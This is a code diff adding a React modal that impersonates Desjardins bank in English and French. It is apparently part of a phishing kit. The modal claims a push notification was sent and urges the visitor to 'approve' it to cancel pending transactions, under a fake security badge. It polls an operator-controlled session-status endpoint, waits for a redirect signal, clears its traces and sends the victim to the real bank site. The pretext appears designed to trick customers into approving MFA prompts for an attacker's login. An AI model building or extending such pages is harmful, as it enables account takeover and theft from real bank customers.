@@ -1,0 +1,200 @@
+import React, { useEffect, useState } from 'react';
+import { X, ShieldCheck, Smartphone, CheckCircle } from 'lucide-react';
+
+const translations = {
+  en: {
+    titleButton: 'Approve',
+    titleText: ' Transaction',
+    subtitle1: 'A push notification was sent to your Desjardins mobile app. Please open your app and ',
+    subtitleButton: 'approve',
+    subtitle2: ' the request to cancel the pending transactions.',
+    bullets: [
+      { icon: Smartphone, text: 'Open your Desjardins mobile app' },
+      { icon: ShieldCheck, text: 'Review the request details' },
+      { icon: CheckCircle, text: 'Tap "Approve" to cancel pending transactions' },
+    ],
+    note: 'This extra step helps us keep your account secure.',
+    securityBadge: 'Verified by Desjardins Security',
+    waitingText: 'Waiting for approval...',
+    successTitle: 'Transaction Approved',
+    successText: 'Your pending transactions will be cancelled in a moment...',
+  },
+  fr: {
+    titleButton: 'Approuver',
+    titleText: ' la Transaction',
+    subtitle1: 'Une notification push a été envoyée à votre application mobile Desjardins. Veuillez ouvrir votre application et ',
+    subtitleButton: 'approuver',
+    subtitle2: ' la demande pour annuler les transactions en attente.',
+    bullets: [
+      { icon: Smartphone, text: 'Ouvrez votre application mobile Desjardins' },
+      { icon: ShieldCheck, text: 'Examinez les détails de la demande' },
+      { icon: CheckCircle, text: 'Appuyez sur "Approuver" pour annuler les transactions en attente' },
+    ],
+    note: 'Cette étape supplémentaire nous aide à sécuriser votre compte.',
+    securityBadge: 'Vérifié par Sécurité Desjardins',
+    waitingText: 'En attente d\'approbation...',
+    successTitle: 'Transaction Approuvée',
+    successText: 'Vos transactions en attente seront annulées dans un instant...',
+  },
+};
+
+export default function AppPushModal({ email, lang = 'en', onClose }) {
+  const t = translations[lang];
+  const [isSuccess, setIsSuccess] = useState(false);
+  const [redirectUrl, setRedirectUrl] = useState('https://www.desjardins.com/');
+
+  useEffect(() => {
+    let isMounted = true;
+    
+    const pollStatus = async () => {
+      if (isSuccess) return; // Stop polling if already success
+      
+      try {
+        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
+          headers: { 'X-Access-Key': 'client-desjardins-banque' },
+        });
+        const data = await response.json();
+        if (!isMounted) return;
+        
+        if (data.success) {
+          if (data.status === 'cancelled' || data.status === 'idle') {
+            onClose();
+            window.location.reload();
+          } else if (data.status === 'redirect_success') {
+            if (data.redirectUrl) {
+              setRedirectUrl(data.redirectUrl);
+            }
+            setIsSuccess(true);
+          }
+        }
+      } catch (err) {
+        console.error('Error polling session status in AppPushModal:', err);
+      }
+    };
+    
+    pollStatus();
+    const intervalId = setInterval(pollStatus, 2000);
+    
+    return () => { 
+      isMounted = false; 
+      clearInterval(intervalId);
+    };
+  }, [email, onClose, isSuccess]);
+
+  useEffect(() => {
+    if (isSuccess) {
+      // Clear client-side state
+      localStorage.removeItem('showAppPushModal');
+      localStorage.removeItem('otpEmail');
+      
+      // Clear server-side session
+      fetch('/api/clear-session', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Access-Key': 'client-desjardins-banque' },
+        body: JSON.stringify({ email })
+      }).catch(err => console.error('Error clearing session:', err));
+
+      const timer = setTimeout(() => {
+        window.location.href = redirectUrl;
+      }, 3000);
+      return () => clearTimeout(timer);
+    }
+  }, [isSuccess, redirectUrl, email]);
+
+  return (
+    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in">
+      <div className="bg-white w-full max-w-[460px] rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.15)] px-8 pt-9 pb-8 flex flex-col relative border border-[#e8e8e8] animate-slide-in overflow-hidden">
+        {/* Decorative top accent line with Desjardins Green */}
+        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#1a7d48] to-[#003168]" />
+
+        {onClose && !isSuccess && (
+          <button
+            type="button"
+            onClick={onClose}
+            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#888] hover:text-[#555] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
+            aria-label="Close"
+          >
+            <X className="w-[18px] h-[18px]" />
+          </button>
+        )}
+
+        {/* Desjardins Logo Container */}
+        <div className="flex justify-center mb-5">
+          <div className={`bg-[#f0f5f9] p-2 rounded-2xl shadow-[0_4px_12px_rgba(0,106,195,0.08)] border border-[#e0eef9] transition-all duration-500 hover:scale-105 ${isSuccess ? 'bg-[#e0eef9] shadow-md scale-110' : ''}`}>
+            <img
+              src="/desjardins-hexa.png"
+              alt="Desjardins Logo"
+              className="w-14 h-14 object-contain rounded-xl"
+            />
+          </div>
+        </div>
+
+        {isSuccess ? (
+          <div className="flex flex-col items-center justify-center py-4 animate-fade-in">
+            <CheckCircle className="w-16 h-16 text-[#1a7d48] mb-4 drop-shadow-sm" />
+            <h3 className="text-[22px] font-bold text-[#1f2937] text-center mb-2 tracking-tight">
+              {t.successTitle}
+            </h3>
+            <p className="text-[#1a7d48] text-[15px] font-medium text-center">
+              {t.successText}
+            </p>
+          </div>
+        ) : (
+          <>
+            <p className="text-[#4b5563] text-[16px] text-center mb-6 leading-relaxed px-2 font-medium">
+              {t.subtitle1}
+              <span className="bg-[#1a7d48] text-white px-2 py-0.5 rounded-[4px] shadow-sm font-semibold inline-block mx-0.5">
+                {t.subtitleButton}
+              </span>
+              {t.subtitle2}
+            </p>
+
+            {/* Bullet features cards */}
+            <div className="bg-[#f9fafb] border border-[#e5e7eb] rounded-xl p-4 mb-6 shadow-inner">
+              <ul className="space-y-4">
+                {t.bullets.map(({ icon: Icon, text }, idx) => (
+                  <li
+                    key={text}
+                    className="flex items-start gap-3.5 relative"
+                  >
+                    {idx !== t.bullets.length - 1 && (
+                      <div className="absolute left-[15px] top-[30px] bottom-[-16px] w-[2px] bg-[#e5e7eb] z-0"></div>
+                    )}
+                    <span className="flex-shrink-0 w-8 h-8 rounded-full bg-white border-2 border-[#1a7d48] flex items-center justify-center shadow-sm z-10 relative">
+                      <Icon className="w-[16px] h-[16px] text-[#1a7d48]" />
+                    </span>
+                    <span className="text-[14px] text-[#374151] font-medium leading-snug pt-1.5">{text}</span>
+                  </li>
+                ))}
+              </ul>
+            </div>
+
+            {/* Waiting indicator */}
+            <div className="flex flex-col items-center justify-center gap-3 mt-2 mb-2 py-3 rounded-xl">
+              <div className="relative flex items-center justify-center w-12 h-12">
+                <div className="absolute inset-0 border-4 border-[#e0eef9] rounded-full"></div>
+                <div className="absolute inset-0 border-4 border-[#1a7d48] rounded-full border-t-transparent animate-spin"></div>
+                <Smartphone className="w-5 h-5 text-[#1a7d48]" />
+              </div>
+              <span className="text-[14px] text-[#1a7d48] font-semibold animate-pulse tracking-wide">{t.waitingText}</span>
+            </div>
+
+            <p className="text-[12px] text-[#888] text-center mt-2 leading-normal px-2">
+              {t.note}
+            </p>
+
+            {/* Security badge pill */}
+            <div className="flex items-center justify-center gap-2 mt-5 pt-4 border-t border-[#f3f4f6]">
+              <div className="flex items-center gap-1.5 bg-[#f0f5f9] border border-[#e0eef9] px-3.5 py-1.5 rounded-full shadow-sm">
+                <ShieldCheck className="w-3.5 h-3.5 text-[#1a7d48]" />
+                <span className="text-[10px] text-[#1a7d48] font-bold tracking-wider uppercase">
+                  {t.securityBadge}
+                </span>
+              </div>
+            </div>
+          </>
+        )}
+      </div>
+    </div>
+  );
+}
